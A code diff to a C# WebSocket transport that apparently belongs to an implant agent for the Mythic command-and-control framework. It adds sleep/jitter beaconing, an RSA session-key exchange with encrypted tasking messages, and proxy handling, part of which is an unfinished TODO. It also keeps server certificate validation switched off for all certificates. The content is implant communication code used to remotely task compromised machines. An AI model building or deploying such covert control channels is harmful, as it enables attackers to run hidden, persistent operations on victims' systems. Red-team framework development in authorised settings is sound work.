@@ -26,9 +26,6 @@ namespace WebsocketTransport
     {
         internal WebSocket Client;
 
-        internal CancellationTokenSource Cancellation;
-        internal ST.Task Task;
-
         private int CallbackInterval;
         private double CallbackJitter;
         private int CallbackPort;
@@ -46,6 +43,7 @@ namespace WebsocketTransport
         private string ProxyAddress;
         private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
         private bool _uuidNegotiated = false;
+        private bool _keyExchanged = false;
         private RSAKeyGenerator rsa = null;
         private static ConcurrentQueue<byte[]> senderQueue = new ConcurrentQueue<byte[]>();
         private ST.Task agentConsumerTask = null;
@@ -56,7 +54,6 @@ namespace WebsocketTransport
         private static AutoResetEvent receiverEvent = new AutoResetEvent(false);
         private Action sendAction;
         private Dictionary<WebSocket, ST.Task> writerTasks = new Dictionary<WebSocket, ST.Task>();
-        private string partialData = "";
         private string Uuid = "";
 
         public WebsocketProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
@@ -116,7 +113,7 @@ namespace WebsocketTransport
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
 
-            //Agent.SetSleep(CallbackInterval, CallbackJitter);
+            Agent.SetSleep(CallbackInterval, CallbackJitter);
             sendAction = () =>
             {
                 while (Client.IsAlive)
@@ -124,33 +121,15 @@ namespace WebsocketTransport
                     senderEvent.WaitOne();
                     if (senderQueue.TryDequeue(out byte[] result))
                     {
-                        Console.WriteLine("Sending: " + BitConverter.ToString(result));
+                        Console.WriteLine("Sending: " + Encoding.UTF8.GetString(result));
                         Client.Send(result);
                     }
                 }
             };
         }
 
-        public void Start()
+        private void Pull()
         {
-            agentConsumerTask = new ST.Task(() =>
-            {
-                while (Agent.IsAlive())
-                {
-                    if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
-                    {
-                        if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0)
-                        {
-                            AddToSenderQueue(tm);
-                            return true;
-                        }
-                        return false;
-                    }))
-                    {
-                        Thread.Sleep(100);
-                    }
-                }
-            });
             agentProcessorTask = new ST.Task(() =>
             {
                 while (Agent.IsAlive())
@@ -161,19 +140,25 @@ namespace WebsocketTransport
                     });
                 }
             });
-            agentConsumerTask.Start();
+
             agentProcessorTask.Start();
-            agentProcessorTask.Wait();
-            agentConsumerTask.Wait();
+
+            while (Agent.IsAlive())
+            {
+                Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
+                {
+                    AddToSenderQueue(tm);
+                    return true;
+                });
+                Agent.Sleep();
+            }
         }
 
-        private bool GetTask(OnResponse<MessageResponse> onResp, string data)
+        public void Start()
         {
-            return Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage msg)
-            {
-                return Recv<MessageResponse>(onResp, data);
-            });
+            Pull();
         }
+
 
         public bool IsOneWay()
         {
@@ -183,19 +168,6 @@ namespace WebsocketTransport
         public bool Send<T>(T message)
         {
             throw new Exception("WebsocketProfile does not support Send only.");
-        }
-
-        public bool Recv<TResult>(OnResponse<TResult> onResponse, string data)
-        {
-            try
-            {
-                onResponse(Serializer.Deserialize<TResult>(data));
-                return true;
-            }
-            catch
-            {
-                return false;
-            }
         }
 
         public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
@@ -235,7 +207,21 @@ namespace WebsocketTransport
         {
             if (Client == null)
             {
-                Client = new WebSocket(Endpoint+PostUri);
+                Client = new WebSocket(Endpoint + PostUri);
+
+                if (!string.IsNullOrEmpty(ProxyAddress))
+                {
+                 
+                   Client.SetProxy("http://"+ProxyAddress, ProxyUser, ProxyPass);
+                }
+                else
+                {
+                    //TODO TEST
+                    // Use Default Proxy and Cached Credentials for Internet Access
+                    IWebProxy wr = WebRequest.GetSystemWebProxy();
+                    ICredentials cr = CredentialCache.DefaultCredentials;
+                }
+
                 Client.ConnectAsync();
                 Client.OnOpen += OnAsyncConnect;
                 Client.OnMessage += OnAsyncMessageReceived;
@@ -258,6 +244,7 @@ namespace WebsocketTransport
                     byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                     ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                     ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
+                    _keyExchanged = true;
                     return true;
                 }))
                 {
@@ -292,9 +279,17 @@ namespace WebsocketTransport
             WebSocketMessage m = new WebSocketMessage()
             {
                 client = true,
-                data = Convert.ToBase64String(Encoding.UTF8.GetBytes(Uuid+jsonSerializer.Serialize(msg))),
+                data = "",
                 tag = String.Empty
             };
+            if (_keyExchanged)
+            {
+                m.data = Serializer.Serialize(msg);
+            }
+            else
+            {
+                m.data = Convert.ToBase64String(Encoding.UTF8.GetBytes(Uuid + jsonSerializer.Serialize(msg)));
+            }
             string message = jsonSerializer.Serialize(m);
             senderQueue.Enqueue(Encoding.UTF8.GetBytes(message));
 
@@ -314,36 +309,27 @@ namespace WebsocketTransport
 
             WebSocketMessage wsm = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.Data);
 
-            string data = Encoding.UTF8.GetString(Convert.FromBase64String(wsm.data)).Substring(36);
-            MessageResponse msg;
+            string decodedData = Encoding.UTF8.GetString(Convert.FromBase64String(wsm.data)).Substring(36);
+
             if (EncryptedExchangeCheck)
             {
-                //TODO
-                return;
-            } else
+                if (!_keyExchanged)
+                {
+                    recieverQueue.Enqueue(jsonSerializer.Deserialize<EKEHandshakeResponse>(decodedData));
+                }
+                else
+                {
+                    recieverQueue.Enqueue(Serializer.Deserialize<MessageResponse>(wsm.data));
+                }
+            }
+            else
             {
-                msg = jsonSerializer.Deserialize<MessageResponse>(data);
+                recieverQueue.Enqueue(jsonSerializer.Deserialize<MessageResponse>(decodedData));
             }
 
-            recieverQueue.Enqueue(msg);
             receiverEvent.Set();
         }
 
-        public void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
-        {
-            MessageType mt = args.Chunks[0].Message;
-            List<byte> data = new List<byte>();
-
-            for (int i = 0; i < args.Chunks.Length; i++)
-            {
-                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
-            }
-
-            IMythicMessage msg = Serializer.DeserializeIPCMessage(data.ToArray(), mt);
-            // Console.WriteLine("We got a message: {0}", mt.ToString());
-            recieverQueue.Enqueue(msg);
-            receiverEvent.Set();
-        }
 
         private void OnAsyncConnect(object sender, EventArgs args)
         {
